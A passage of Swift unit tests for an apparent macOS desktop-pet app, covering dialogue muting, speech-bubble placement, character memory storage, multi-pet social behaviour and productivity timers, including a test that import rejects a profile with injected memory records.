func testPhase7DialogueMutePreferenceAndStaleSuppression() {
    print("Running testPhase7DialogueMutePreferenceAndStaleSuppression...")
    let engine = DialogueEngine(characterId: UUID(), characterName: "MuteTestPet")
    let now = Date()
    
    // 1. dialogueMuted = true suppresses dialogue completely
    var mutedProfile = PersonalityProfile.preset(.balanced)
    mutedProfile.behaviorPreferences.dialogueMuted = true
    
    let mutedResult = engine.evaluateTrigger(
        .petClicked,
        personality: mutedProfile,
        needs: CharacterNeeds(),
        currentAction: .idle,
        dialogueEnabled: true,
        referenceDate: now
    )
    TestHarness.assertTrue(mutedResult == nil, "Per-character dialogueMuted must suppress speech bubbles entirely")
    
    // 2. dialogueMuted = false permits dialogue
    var activeProfile = PersonalityProfile.preset(.balanced)
    activeProfile.behaviorPreferences.dialogueMuted = false
    
    let activeResult = engine.evaluateTrigger(
        .petClicked,
        personality: activeProfile,
        needs: CharacterNeeds(),
        currentAction: .idle,
        dialogueEnabled: true,
        referenceDate: now
    )
    TestHarness.assertTrue(activeResult != nil, "Unmuted character allows speech bubbles")
    
    // 3. Stale event suppression: timestamp older than 5.0s is rejected
    let staleDate = now.addingTimeInterval(-10.0)
    let staleResult = engine.evaluateTrigger(
        .petClicked,
        personality: activeProfile,
        needs: CharacterNeeds(),
        currentAction: .idle,
        dialogueEnabled: true,
        referenceDate: staleDate
    )
    TestHarness.assertTrue(staleResult == nil, "Stale trigger (> 5s old) must be suppressed to prevent speech bursts")
    
    // 4. Quiet Mode master suppression
    let quietResult = engine.evaluateTrigger(
        .petClicked,
        personality: activeProfile,
        needs: CharacterNeeds(),
        currentAction: .idle,
        dialogueEnabled: true,
        quietModeEnabled: true,
        referenceDate: now
    )
    TestHarness.assertTrue(quietResult == nil, "Quiet Mode must suppress all speech")
}

func testPhase7SpeechBubbleAdaptivePositioningAndDismissal() {
    print("Running testPhase7SpeechBubbleAdaptivePositioningAndDismissal...")
    let panel = SpeechBubblePanel()
    panel.setContentSize(NSSize(width: 200, height: 60))
    let screen = NSScreen.main ?? NSScreen()
    
    // 1. Top of screen: clearance check triggers flip to .up direction and places below pet
    let highPetTopY = screen.visibleFrame.maxY - 10
    let highPetBottomY = highPetTopY - 100
    let topDirection = panel.updatePosition(
        petCenter: NSPoint(x: 500, y: highPetBottomY + 50),
        petTopY: highPetTopY,
        petBottomY: highPetBottomY,
        isUpsideDown: false,
        screen: screen
    )
    TestHarness.assertEqual(topDirection, SpeechBubblePointerDirection.up, message: "Near top of screen, pointer direction flips to .up")
    TestHarness.assertTrue(panel.frame.origin.y <= highPetBottomY, "Near top of screen, bubble is placed below pet bottom")
    TestHarness.assertTrue(panel.frame.origin.y + panel.frame.height <= screen.visibleFrame.maxY, "Bubble remains within visible screen frame")
    
    // 2. Normal screen position: places above pet with .down direction
    let normalPetTopY: CGFloat = 300
    let normalPetBottomY: CGFloat = 200
    let normalDirection = panel.updatePosition(
        petCenter: NSPoint(x: 500, y: 250),
        petTopY: normalPetTopY,
        petBottomY: normalPetBottomY,
        isUpsideDown: false,
        screen: screen
    )
    TestHarness.assertEqual(normalDirection, SpeechBubblePointerDirection.down, message: "In normal clearance, pointer direction is .down")
    TestHarness.assertTrue(panel.frame.origin.y >= normalPetTopY, "Bubble sits above pet top")
    
    // 3. Panel accepts clicks for manual dismissal and does not ignore mouse events
    TestHarness.assertFalse(panel.ignoresMouseEvents, "SpeechBubblePanel must not ignore mouse events so clicking bubble dismisses it")
    
    // 4. View dismiss callback invocable
    var dismissed = false
    let view = SpeechBubbleView(text: "Hello", direction: .down, onDismiss: {
        dismissed = true
    })
    view.onDismiss?()
    TestHarness.assertTrue(dismissed, "onDismiss callback can be triggered manually to hide speech bubble")
}

func testPhase7EnvironmentUserReturnedEventEmission() {
    print("Running testPhase7EnvironmentUserReturnedEventEmission...")
    let monitor = EnvironmentMonitor()
    monitor.stopMonitoring()
    monitor.isEnabled = true
    monitor.inactivityTrackingEnabled = true
    
    var simulatedTime = Date()
    monitor.nowProvider = { simulatedTime }
    
    var capturedEvents: [EnvironmentEvent] = []
    monitor.onEvent = { event in
        capturedEvents.append(event)
    }
    
    // Advance past moderate inactivity (300s)
    simulatedTime = simulatedTime.addingTimeInterval(350)
    monitor.checkProximityAndInactivity()
    TestHarness.assertTrue(monitor.snapshot.isUserInactive, "Snapshot marks user inactive")
    
    // User returns and interacts (e.g. click)
    capturedEvents.removeAll()
    monitor.recordUserInteraction(type: .click)
    
    TestHarness.assertFalse(monitor.snapshot.isUserInactive, "Interaction resets inactivity state")
    let hasUserReturned = capturedEvents.contains(where: { $0.type == .userReturned })
    TestHarness.assertTrue(hasUserReturned, "Resuming interaction after inactivity must emit .userReturned event")
}

// MARK: - Phase 8 & 9 Mock Test Structures

struct MockTestRandomSource: RandomSource {
    var values: [Double]
    private var index = 0
    init(values: [Double]) { self.values = values }
    mutating func nextDouble() -> Double {
        guard !values.isEmpty else { return 0.5 }
        let val = values[index % values.count]
        index += 1
        return val
    }
}

class MockSocialCompanion: SocialParticipant {
    let id: UUID
    var name: String
    var characterId: String
    var centerPoint: NSPoint {
        NSPoint(x: currentX + 50, y: currentY + 50)
    }
    var currentX: CGFloat
    var currentY: CGFloat
    var isFalling: Bool = false
    var isHovering: Bool = false
    var isDragging: Bool = false
    var isUpsideDown: Bool = false
    var isSleeping: Bool = false
    var walkDirectionRight: Bool = true
    var walkBobOffset: CGFloat = 0
    var behaviorEngine: BehaviorEngine
    var triggeredDialogues: [DialogueTrigger] = []

    init(
        id: UUID = UUID(),
        name: String,
        characterId: String,
        x: CGFloat = 100,
        y: CGFloat = 0,
        profile: PersonalityProfile = PersonalityProfile.preset(.balanced)
    ) {
        self.id = id
        self.name = name
        self.characterId = characterId
        self.currentX = x
        self.currentY = y
        self.behaviorEngine = BehaviorEngine(profile: profile)
    }

    func setWalkingState() {
        isSleeping = false
        behaviorEngine.forceAction(.walking)
    }

    func setIdleState() {
        isSleeping = false
        behaviorEngine.forceAction(.idle)
    }

    func triggerDialogue(_ trigger: DialogueTrigger, appName: String? = nil) {
        triggeredDialogues.append(trigger)
    }
}

// MARK: - Phase 8 Unit Tests (Character Memory and Continuity)

func testCharacterMemoryRecordAndStoreBasics() {
    print("Running testCharacterMemoryRecordAndStoreBasics...")
    let tempURL = URL(fileURLWithPath: "/tmp/test_memories_basics_\(UUID().uuidString).json")
    let store = CharacterMemoryStore(storageURL: tempURL)
    defer { try? FileManager.default.removeItem(at: tempURL) }
    
    let charId = "companion_alpha"
    let longSummary = String(repeating: "A", count: 300)
    
    let record = store.recordMemory(
        characterId: charId,
        category: .durableSocial,
        eventType: .socialGreeting,
        summary: longSummary,
        partnerCharacterId: "companion_beta",
        partnerName: "Beta"
    )
    
    TestHarness.assertTrue(record != nil, "Record must be created")
    TestHarness.assertEqual(record?.characterId, charId, message: "Character ID must match")
    TestHarness.assertEqual(record?.category, MemoryCategory.durableSocial, message: "Category matches")
    TestHarness.assertEqual(record?.eventType, MemoryEventType.socialGreeting, message: "Event type matches")
    TestHarness.assertEqual(record?.partnerCharacterId, "companion_beta", message: "Partner ID matches")
    TestHarness.assertEqual(record?.partnerName, "Beta", message: "Partner name matches")
    TestHarness.assertTrue(record?.summary.count ?? 0 <= 200, "Summary must be capped at 200 characters")
    
    let memories = store.memories(for: charId)
    TestHarness.assertEqual(memories.count, 1, message: "Character memory store contains 1 record")
    TestHarness.assertEqual(store.totalMemoryCount(), 1, message: "Total count is 1")
    TestHarness.assertEqual(store.memoryCount(for: charId), 1, message: "Count for character is 1")
}

func testCharacterMemoryDeduplicationAndConsolidation() {
    print("Running testCharacterMemoryDeduplicationAndConsolidation...")
    let tempURL = URL(fileURLWithPath: "/tmp/test_memories_dedup_\(UUID().uuidString).json")
    let store = CharacterMemoryStore(storageURL: tempURL)
    defer { try? FileManager.default.removeItem(at: tempURL) }
    
    let charA = "companion_a"
    let charB = "companion_b"
    
    // First encounter
    store.recordSocialEncounter(characterId: charA, partnerId: charB, partnerName: "Beta", actionType: "greet")
    TestHarness.assertEqual(store.memoryCount(for: charA), 1, message: "First encounter creates 1 record")
    TestHarness.assertEqual(store.interactionCount(characterId: charA, with: charB), 1, message: "Interaction count is 1")
    
    // Repeated encounter with same partner and same event type
    store.recordSocialEncounter(characterId: charA, partnerId: charB, partnerName: "Beta", actionType: "greet")
    
    // Deduplication should consolidate, not expand unbounded records
    TestHarness.assertEqual(store.memoryCount(for: charA), 1, message: "Repeated encounter should consolidate instead of creating duplicate")
    TestHarness.assertEqual(store.interactionCount(characterId: charA, with: charB), 2, message: "Interaction count consolidated to 2")
    
    // Third encounter
    store.recordSocialEncounter(characterId: charA, partnerId: charB, partnerName: "Beta", actionType: "greet")
    TestHarness.assertEqual(store.interactionCount(characterId: charA, with: charB), 3, message: "Interaction count consolidated to 3")
}

func testCharacterMemoryTransientExpirationAndPruning() {
    print("Running testCharacterMemoryTransientExpirationAndPruning...")
    let tempURL = URL(fileURLWithPath: "/tmp/test_memories_exp_\(UUID().uuidString).json")
    let store = CharacterMemoryStore(storageURL: tempURL)
    defer { try? FileManager.default.removeItem(at: tempURL) }
    
    var simTime = Date()
    store.nowProvider = { simTime }
    
    let charId = "companion_timed"
    
    // 1. Record transient memory expiring in 60 seconds
    store.recordMemory(
        characterId: charId,
        category: .shortTermInteraction,
        eventType: .companionInteraction,
        summary: "Transient hello",
        expiresIn: 60
    )
    
    // 2. Record durable memory with no expiration
    store.recordMemory(
        characterId: charId,
        category: .durableSocial,
        eventType: .socialPlay,
        summary: "Durable friendship memory",
        expiresIn: nil
    )
    
    TestHarness.assertEqual(store.memories(for: charId).count, 2, message: "Both memories active initially")
    
    // Advance time by 30 seconds (still within transient lifespan)
    simTime = simTime.addingTimeInterval(30)
    TestHarness.assertEqual(store.memories(for: charId).count, 2, message: "Memories still active at +30s")
    
    // Advance time by 70 seconds (transient expired, durable persists)
    simTime = simTime.addingTimeInterval(40)
    let activeAfterExpiry = store.memories(for: charId)
    TestHarness.assertEqual(activeAfterExpiry.count, 1, message: "Transient record pruned after expiration")
    TestHarness.assertEqual(activeAfterExpiry.first?.category, MemoryCategory.durableSocial, message: "Durable memory remains active")
    
    store.pruneExpiredMemories()
    TestHarness.assertEqual(store.memoryCount(for: charId), 1, message: "Pruned memory count matches durable only")
}

func testCharacterMemoryDisablementAndClearing() {
    print("Running testCharacterMemoryDisablementAndClearing...")
    let tempURL = URL(fileURLWithPath: "/tmp/test_memories_clear_\(UUID().uuidString).json")
    let store = CharacterMemoryStore(storageURL: tempURL)
    defer { try? FileManager.default.removeItem(at: tempURL) }
    
    let charA = "companion_x"
    let charB = "companion_y"
    
    store.recordMemory(characterId: charA, category: .durableSocial, eventType: .userNote, summary: "Note A")
    let memB = store.recordMemory(characterId: charB, category: .durableSocial, eventType: .userNote, summary: "Note B")
    TestHarness.assertEqual(store.totalMemoryCount(), 2, message: "Store has 2 memories")
    
    // 1. Delete individual memory
    if let idB = memB?.id {
        store.deleteMemory(id: idB, for: charB)
        TestHarness.assertEqual(store.memoryCount(for: charB), 0, message: "Individual memory deleted")
        TestHarness.assertEqual(store.totalMemoryCount(), 1, message: "Total is now 1")
    }
    
    // 2. Per-character disablement
    store.setMemoryEnabled(false, for: charB)
    TestHarness.assertFalse(store.isMemoryEnabled(for: charB), "Character B memory is disabled")
    let rejected = store.recordMemory(characterId: charB, category: .durableSocial, eventType: .userNote, summary: "Rejected Note")
    TestHarness.assertTrue(rejected == nil, "Recording when disabled returns nil")
    
    // 3. Global disablement
    store.isMemoryEnabledGlobally = false
    TestHarness.assertFalse(store.isMemoryEnabled(for: charA), "Character A disabled when globally disabled")
    let rejectedGlobal = store.recordMemory(characterId: charA, category: .durableSocial, eventType: .userNote, summary: "Rejected Note A")
    TestHarness.assertTrue(rejectedGlobal == nil, "Recording when globally disabled returns nil")
    
    // Re-enable and test clear
    store.isMemoryEnabledGlobally = true
    store.clearAllMemories()
    TestHarness.assertEqual(store.totalMemoryCount(), 0, message: "clearAllMemories clears all records")
}

func testProfileExportExcludesPrivateMemories() {
    print("Running testProfileExportExcludesPrivateMemories...")
    var profile = PersonalityProfile.preset(.balanced)
    profile.behaviorPreferences.memoryEnabled = true
    profile.behaviorPreferences.socialInteractionsEnabled = true
    
    // Export profile
    let exportResult = PersonalityStorage.shared.exportProfileJSON(profile)
    switch exportResult {
    case .success(let data):
        let jsonString = String(data: data, encoding: .utf8) ?? ""
        // Validate private memories are not exported
        TestHarness.assertFalse(jsonString.contains("character_memories"), "Exported profile must not reference character memory store")
        TestHarness.assertFalse(jsonString.contains("memories"), "Exported profile must not contain raw memories")
    case .failure(let err):
        TestHarness.assertTrue(false, "Export profile failed: \(err)")
    }
    
    // Test import sanitization against malicious injection of memories
    let maliciousPayload = """
    {
        "schemaVersion": 1,
        "name": "Malicious",
        "energy": 0.5,
        "playfulness": 0.5,
        "curiosity": 0.5,
        "affection": 0.5,
        "shyness": 0.5,
        "mischief": 0.5,
        "independence": 0.5,
        "sociability": 0.5,
        "laziness": 0.5,
        "memories": [
            {"summary": "Injected memory record"}
        ]
    }
    """
    
    let maliciousData = maliciousPayload.data(using: .utf8)!
    let importResult = PersonalityStorage.shared.importProfile(from: maliciousData)
    switch importResult {
    case .success:
        TestHarness.assertTrue(false, "Import must reject profiles containing forbidden private memory keys")
    case .failure(let reason):
        TestHarness.assertTrue(reason.contains("Security check failed"), "Rejection reason indicates security check failure")
    }
}

// MARK: - Phase 9 Unit Tests (Multi-Character Social Behavior)

func testSocialFeasibilityChecks() {
    print("Running testSocialFeasibilityChecks...")
    let sim = SocialInteractionManager()
    sim.isEnabled = true
    
    let petA = MockSocialCompanion(name: "A", characterId: "char_a", x: 100, y: 0)
    let petB = MockSocialCompanion(name: "B", characterId: "char_b", x: 200, y: 0)
    
    // 1. Normal compatible state
    TestHarness.assertTrue(sim.checkFeasibility(initiator: petA, target: petB), "Compatible companions within range should be feasible")
    
    // 2. Out of range (too close < 60)
    petB.currentX = 130
    TestHarness.assertFalse(sim.checkFeasibility(initiator: petA, target: petB), "Companions closer than 60pt should not be feasible for approach")
    
    // 3. Out of range (too far > 380)
    petB.currentX = 600
    TestHarness.assertFalse(sim.checkFeasibility(initiator: petA, target: petB), "Companions further than 380pt should not be feasible")
    petB.currentX = 220
    
    // 4. Different vertical floors (> 25pt gap)
    petB.currentY = 100
    TestHarness.assertFalse(sim.checkFeasibility(initiator: petA, target: petB), "Companions on different vertical surfaces should not interact")
    petB.currentY = 0
    
    // 5. Upside-down mode mismatch
    petA.isUpsideDown = true
    petB.isUpsideDown = false
    TestHarness.assertFalse(sim.checkFeasibility(initiator: petA, target: petB), "Upside-down mismatch should reject interaction")
    petA.isUpsideDown = false
    
    // 6. Physics states (falling / dragging)
    petA.isDragging = true
    TestHarness.assertFalse(sim.checkFeasibility(initiator: petA, target: petB), "Dragging companion should reject interaction")
    petA.isDragging = false
    
    petB.isFalling = true
    TestHarness.assertFalse(sim.checkFeasibility(initiator: petA, target: petB), "Falling target should reject interaction")
    petB.isFalling = false
    
    // 7. Per-companion preference disabled
    petA.behaviorEngine.profile.behaviorPreferences.socialInteractionsEnabled = false
    TestHarness.assertFalse(sim.checkFeasibility(initiator: petA, target: petB), "Disabled social preference should reject interaction")
    petA.behaviorEngine.profile.behaviorPreferences.socialInteractionsEnabled = true
    
    // 8. Sleeping lazy/independent companion declines
    let lazyProfile = PersonalityProfile(name: "LazyIndep", preset: .sleepy, laziness: 0.9, independence: 0.8)
    petB.behaviorEngine.profile = lazyProfile
    petB.isSleeping = true
    TestHarness.assertFalse(sim.checkFeasibility(initiator: petA, target: petB), "Lazy/independent sleeping target declines casual social approach")
}

func testSocialPairCooldown() {
    print("Running testSocialPairCooldown...")
    let cooldown = SocialPairCooldownManager()
    cooldown.pairCooldownDuration = 40.0
    
    let idA = UUID()
    let idB = UUID()
    var simTime = Date()
    
    // Initially can interact
    TestHarness.assertTrue(cooldown.canInteract(petA: idA, petB: idB, now: simTime), "Initial interaction is allowed")
    
    // Record interaction
    cooldown.recordInteraction(petA: idA, petB: idB, now: simTime)
    
    // Immediately after, cooldown is active in both directions (symmetric)
    TestHarness.assertFalse(cooldown.canInteract(petA: idA, petB: idB, now: simTime), "Cooldown active A->B")
    TestHarness.assertFalse(cooldown.canInteract(petA: idB, petB: idA, now: simTime), "Cooldown active B->A (symmetric)")
    
    // Advance 20s (still on cooldown)
    simTime = simTime.addingTimeInterval(20)
    TestHarness.assertFalse(cooldown.canInteract(petA: idA, petB: idB, now: simTime), "Cooldown active at +20s")
    
    // Advance 45s (cooldown expired)
    simTime = simTime.addingTimeInterval(25)
    TestHarness.assertTrue(cooldown.canInteract(petA: idA, petB: idB, now: simTime), "Can interact again after 45s elapsed")
}

func testSocialIntentSelectionByPersonality() {
    print("Running testSocialIntentSelectionByPersonality...")
    let sim = SocialInteractionManager()
    var fixedRand = MockTestRandomSource(values: [0.1, 0.2, 0.3])
    
    // 1. Highly sociable companion
    let sociableProfile = PersonalityProfile(name: "Sociable", preset: .balanced, sociability: 0.9, shyness: 0.1)
    let petSociable = MockSocialCompanion(name: "Sociable", characterId: "soc", profile: sociableProfile)
    let petPartner = MockSocialCompanion(name: "Partner", characterId: "part")
    
    let sociableIntent = sim.selectSocialIntent(initiator: petSociable, target: petPartner, randomSource: &fixedRand)
    TestHarness.assertTrue(sociableIntent == .greeting || sociableIntent == .friendlyChat, "Sociable companion selects greeting or chat")
    
    // 2. Highly playful and energetic companion
    let playfulProfile = PersonalityProfile(name: "Playful", preset: .playful, energy: 0.9, playfulness: 0.95, shyness: 0.1)
    let petPlayful = MockSocialCompanion(name: "Playful", characterId: "play", profile: playfulProfile)
    let playfulIntent = sim.selectSocialIntent(initiator: petPlayful, target: petPartner, randomSource: &fixedRand)
    TestHarness.assertEqual(playfulIntent, SocialActionType.playfulHop, message: "Playful energetic companion selects playfulHop")
    
    // 3. Highly shy companion
    let shyProfile = PersonalityProfile(name: "Shy", preset: .shy, sociability: 0.2, shyness: 0.9)
    let petShy = MockSocialCompanion(name: "Shy", characterId: "shy", profile: shyProfile)
    let shyIntent = sim.selectSocialIntent(initiator: petShy, target: petPartner, randomSource: &fixedRand)
    TestHarness.assertEqual(shyIntent, SocialActionType.approachAndObserve, message: "Shy companion prefers approachAndObserve")
    
    // 4. Highly independent companion solo roaming
    let independentProfile = PersonalityProfile(name: "Indep", preset: .balanced, sociability: 0.1, independence: 0.95)
    let petIndependent = MockSocialCompanion(name: "Indep", characterId: "indep", profile: independentProfile)
    var indepRand = MockTestRandomSource(values: [0.1])
    let indepIntent = sim.selectSocialIntent(initiator: petIndependent, target: petPartner, randomSource: &indepRand)
    TestHarness.assertTrue(indepIntent == nil, "Highly independent companion can opt out of social encounters to roam solo")
}

func testSocialEncounterLifecycleAndInterruption() {
    print("Running testSocialEncounterLifecycleAndInterruption...")
    let sim = SocialInteractionManager()
    sim.isEnabled = true
    
    let simTime = Date()
    sim.nowProvider = { simTime }
    
    let petA = MockSocialCompanion(name: "A", characterId: "char_a", x: 100, y: 0)
    let petB = MockSocialCompanion(name: "B", characterId: "char_b", x: 250, y: 0)
    let activeParticipants: [UUID: any SocialParticipant] = [petA.id: petA, petB.id: petB]
    
    // Opportunity check starts encounter
    sim.checkOpportunities(activeParticipants: activeParticipants)
    TestHarness.assertTrue(sim.isParticipating(petId: petA.id), "Pet A is participating in encounter")
    TestHarness.assertTrue(sim.isParticipating(petId: petB.id), "Pet B is participating in encounter")
    
    guard let enc = sim.encounter(for: petA.id) else {
        TestHarness.assertTrue(false, "Active encounter must exist")
        return
    }
    
    // Should be in approaching phase
    if case .approaching = enc.phase {
        TestHarness.assertTrue(true, "Encounter is in approaching phase")
    } else {
        TestHarness.assertTrue(false, "Expected approaching phase")
    }
    
    // User interrupts by dragging Pet A
    petA.isDragging = true
    sim.updateEncounters(activeParticipants: activeParticipants)
    
    // Active encounter must be canceled
    TestHarness.assertFalse(sim.isParticipating(petId: petA.id), "User drag cancels encounter for Pet A")
    TestHarness.assertFalse(sim.isParticipating(petId: petB.id), "User drag cancels encounter for Pet B")
}

func testSocialEncounterDialogueCoordination() {
    print("Running testSocialEncounterDialogueCoordination...")
    let sim = SocialInteractionManager()
    sim.isEnabled = true
    sim.randomSource = MockTestRandomSource(values: [0.1])
    
    var simTime = Date()
    sim.nowProvider = { simTime }
    
    let sociableProfile = PersonalityProfile(name: "Luna", preset: .balanced, sociability: 0.9)
    let petA = MockSocialCompanion(name: "Luna", characterId: "luna", x: 100, y: 0, profile: sociableProfile)
    let petB = MockSocialCompanion(name: "Kuro", characterId: "kuro", x: 180, y: 0) // within contact distance (80pt)
    let activeParticipants: [UUID: any SocialParticipant] = [petA.id: petA, petB.id: petB]
    
    // Opportunity check starts immediate interacting phase due to contact distance
    sim.checkOpportunities(activeParticipants: activeParticipants)
    TestHarness.assertTrue(sim.isParticipating(petId: petA.id), "Encounter started")
    guard let enc = sim.encounter(for: petA.id) else {
        TestHarness.assertTrue(false, "Active encounter must exist")
        return
    }
    
    let initiator = (enc.initiatorId == petA.id) ? petA : petB
    let target = (enc.initiatorId == petA.id) ? petB : petA
    
    // Step 0 tick triggers initiator opening dialogue
    sim.updateEncounters(activeParticipants: activeParticipants)
    TestHarness.assertEqual(initiator.triggeredDialogues.count, 1, message: "Initiator triggered opening dialogue")
    TestHarness.assertEqual(target.triggeredDialogues.count, 0, message: "Target has not yet replied")
    
    // Advance time by 1.6s to trigger step 1 (partner delayed response)
    simTime = simTime.addingTimeInterval(1.6)
    sim.updateEncounters(activeParticipants: activeParticipants)
    TestHarness.assertEqual(target.triggeredDialogues.count, 1, message: "Target triggered coordinated response dialogue")
}

func testSocialMemoryIntegration() {
    print("Running testSocialMemoryIntegration...")
    let tempURL = URL(fileURLWithPath: "/tmp/test_social_memory_\(UUID().uuidString).json")
    let store = CharacterMemoryStore(storageURL: tempURL)
    defer { try? FileManager.default.removeItem(at: tempURL) }
    
    let charA = "companion_alice"
    let charB = "companion_bob"
    
    // Record social play encounter (durable)
    let recA = store.recordSocialEncounter(
        characterId: charA,
        partnerId: charB,
        partnerName: "Bob",
        actionType: "playfulHop",
        isDurable: true
    )
    let recB = store.recordSocialEncounter(
        characterId: charB,
        partnerId: charA,
        partnerName: "Alice",
        actionType: "playfulHop",
        isDurable: true
    )
    
    TestHarness.assertTrue(recA != nil && recB != nil, "Both characters record social memory")
    TestHarness.assertEqual(recA?.category, MemoryCategory.durableSocial, message: "Playful encounter stored as durable memory")
    TestHarness.assertEqual(recB?.category, MemoryCategory.durableSocial, message: "Partner stored as durable memory")
    TestHarness.assertTrue(store.hasRecentInteraction(characterId: charA, with: charB, within: 60), "Recent interaction detected")
}

func testQuietModeSuppressesSocialDialogueOnly() {
    print("Running testQuietModeSuppressesSocialDialogueOnly...")
    let companion = MockSocialCompanion(name: "QuietPet", characterId: "quiet_1")
    companion.behaviorEngine.profile.behaviorPreferences.dialogueMuted = true
    
    // Social participant physical states still work normally
    companion.setWalkingState()
    TestHarness.assertFalse(companion.isSleeping, "Waking state functions normally")
    
    companion.setIdleState()
    TestHarness.assertFalse(companion.isSleeping, "Idle state functions normally")
}

// MARK: - Phase 10 Tests: Productivity Companion

func testProductivityPresetsAndDurationCalculations() {
    print("Running testProductivityPresetsAndDurationCalculations...")
    let countdown5 = ProductivitySessionMode.countdown(minutes: 5)
    TestHarness.assertEqual(countdown5.focusDuration, 300.0, message: "5m countdown is 300s")
    TestHarness.assertEqual(countdown5.breakDuration, 0.0, message: "Countdown has 0s break")
    TestHarness.assertFalse(countdown5.hasBreak, "Countdown hasBreak is false")
    
    let pomodoro = ProductivitySessionMode.pomodoro
    TestHarness.assertEqual(pomodoro.focusDuration, 1500.0, message: "Pomodoro focus is 25m = 1500s")
    TestHarness.assertEqual(pomodoro.breakDuration, 300.0, message: "Pomodoro break is 5m = 300s")
    TestHarness.assertTrue(pomodoro.hasBreak, "Pomodoro hasBreak is true")
    
    let longFocus = ProductivitySessionMode.longFocus
    TestHarness.assertEqual(longFocus.focusDuration, 3000.0, message: "Long focus is 50m = 3000s")
    TestHarness.assertEqual(longFocus.breakDuration, 600.0, message: "Long break is 10m = 600s")
    TestHarness.assertTrue(longFocus.hasBreak, "Long focus hasBreak is true")
    
    // Custom clamping
    let customClamped = ProductivitySessionMode.custom(focusMinutes: 500, breakMinutes: 200)
    TestHarness.assertEqual(customClamped.focusDuration, 360.0 * 60.0, message: "Custom focus clamped to max 360m")
    TestHarness.assertEqual(customClamped.breakDuration, 120.0 * 60.0, message: "Custom break clamped to max 120m")
    
    let customMin = ProductivitySessionMode.custom(focusMinutes: 0, breakMinutes: -5)
    TestHarness.assertEqual(customMin.focusDuration, 60.0, message: "Custom focus clamped to min 1m")
    TestHarness.assertEqual(customMin.breakDuration, 60.0, message: "Custom break clamped to min 1m")
}

func testProductivitySessionLifecycle() {
    print("Running testProductivitySessionLifecycle...")
    let manager = ProductivityTimerManager()
    var simTime = Date()
    manager.nowProvider = { simTime }
    
    var scheduledCalls: [(title: String, duration: TimeInterval, id: UUID)] = []
    manager.notificationHandler = { title, _, duration, id in
        scheduledCalls.append((title: title, duration: duration, id: id))
    }
    
    // 1. Start session
    manager.start(mode: .countdown(minutes: 10))
    TestHarness.assertEqual(manager.currentPhase, ProductivitySessionPhase.focus, message: "Starts in focus phase")
    TestHarness.assertFalse(manager.isPaused, "Session is not paused")
    TestHarness.assertEqual(manager.remainingSeconds, 600.0, message: "Remaining seconds is 600s")
    TestHarness.assertEqual(manager.totalSeconds, 600.0, message: "Total seconds is 600s")
    TestHarness.assertEqual(manager.formattedRemainingTime, "10:00", message: "Formatted time is 10:00")
    TestHarness.assertEqual(scheduledCalls.count, 1, message: "Notification scheduled on start")
    let initialGen = manager.generationId
    
    // 2. Pause session
    simTime = simTime.addingTimeInterval(120.0) // 2 minutes elapsed
    manager.pause()
    TestHarness.assertTrue(manager.isPaused, "Session is paused")
    TestHarness.assertEqual(manager.remainingSeconds, 480.0, message: "Remaining seconds accurately reflects 480s")
    TestHarness.assertEqual(manager.formattedRemainingTime, "08:00", message: "Formatted time paused at 08:00")
    
    // 3. Resume session
    simTime = simTime.addingTimeInterval(60.0) // 1 minute passed while paused
    manager.resume()
    TestHarness.assertFalse(manager.isPaused, "Session resumed")
    TestHarness.assertEqual(manager.remainingSeconds, 480.0, message: "Pause freezes remaining time regardless of wall clock")
    
    // 4. Tick down
    simTime = simTime.addingTimeInterval(60.0)
    manager.tick()
    TestHarness.assertEqual(manager.remainingSeconds, 420.0, message: "After 1 minute resumed tick, 420s remain")
    TestHarness.assertEqual(manager.formattedRemainingTime, "07:00", message: "Formatted time is 07:00")
    
    // 5. Restart
    manager.restart()
    TestHarness.assertEqual(manager.remainingSeconds, 600.0, message: "Restart resets remaining seconds to full duration")
    TestHarness.assertTrue(manager.generationId != initialGen, "Restart issues a new generation ID")
    
    // 6. Stop
    manager.stop()
    TestHarness.assertEqual(manager.currentPhase, ProductivitySessionPhase.idle, message: "Stop resets phase to idle")
    TestHarness.assertEqual(manager.remainingSeconds, 0.0, message: "Stop clears remaining seconds")
}

func testPomodoroFocusToBreakAndCycleTransitions() {
    print("Running testPomodoroFocusToBreakAndCycleTransitions...")
    let manager = ProductivityTimerManager()
    var simTime = Date()
    manager.nowProvider = { simTime }
    
    var phaseEvents: [ProductivitySessionPhase] = []
    manager.onPhaseChange = { phase, _ in
        phaseEvents.append(phase)
    }
    
    // Start Pomodoro (25m focus / 5m break)
    manager.start(mode: .pomodoro)
    TestHarness.assertEqual(manager.currentPhase, ProductivitySessionPhase.focus, message: "Pomodoro starts in focus")
    TestHarness.assertEqual(phaseEvents.last, ProductivitySessionPhase.focus, message: "Phase event fired focus")
    
    // Advance time past 25 minutes
    simTime = simTime.addingTimeInterval(1501.0)
    manager.tick()
    
    // Should transition to breakTime
    TestHarness.assertEqual(manager.currentPhase, ProductivitySessionPhase.breakTime, message: "Pomodoro transitions to breakTime")
    TestHarness.assertEqual(manager.totalSeconds, 300.0, message: "Break total seconds is 300s (5m)")
    TestHarness.assertEqual(phaseEvents.last, ProductivitySessionPhase.breakTime, message: "Phase event fired breakTime")
    
    // Advance time past 5 minutes break
    simTime = simTime.addingTimeInterval(301.0)
    manager.tick()
    
    // Should transition back to focus for next cycle
    TestHarness.assertEqual(manager.currentPhase, ProductivitySessionPhase.focus, message: "Pomodoro loops back to focus after break")
    TestHarness.assertEqual(manager.totalSeconds, 1500.0, message: "Focus total seconds restored to 1500s")
    
    // Skip to break
    manager.skip()
    TestHarness.assertEqual(manager.currentPhase, ProductivitySessionPhase.breakTime, message: "Skip transitions immediately to break")
    
    manager.stop()
}

func testStaleCallbackAndDuplicateCompletionSuppression() {
    print("Running testStaleCallbackAndDuplicateCompletionSuppression...")
    let manager = ProductivityTimerManager()
    var cancelledIds: [UUID] = []
    manager.notificationHandler = { _, _, duration, id in
        if duration == 0 {
            cancelledIds.append(id)
        }
    }
    
    manager.start(mode: .countdown(minutes: 5))
    let firstGen = manager.generationId
    
    // User stops timer
    manager.stop()
    TestHarness.assertTrue(cancelledIds.contains(firstGen), "Stopping timer signals cancellation of previous notification ID")
    
    // Start a new timer
    manager.start(mode: .countdown(minutes: 15))
    let secondGen = manager.generationId
    TestHarness.assertTrue(firstGen != secondGen, "New timer has unique generationId")
    
    manager.stop()
}

func testSuspensionAndSleepWakeHandling() {
    print("Running testSuspensionAndSleepWakeHandling...")
    let manager = ProductivityTimerManager()
    var simTime = Date()
    manager.nowProvider = { simTime }
    
    var completed = false
    manager.onTimerComplete = { _ in
        completed = true
    }
    
    manager.start(mode: .countdown(minutes: 10))
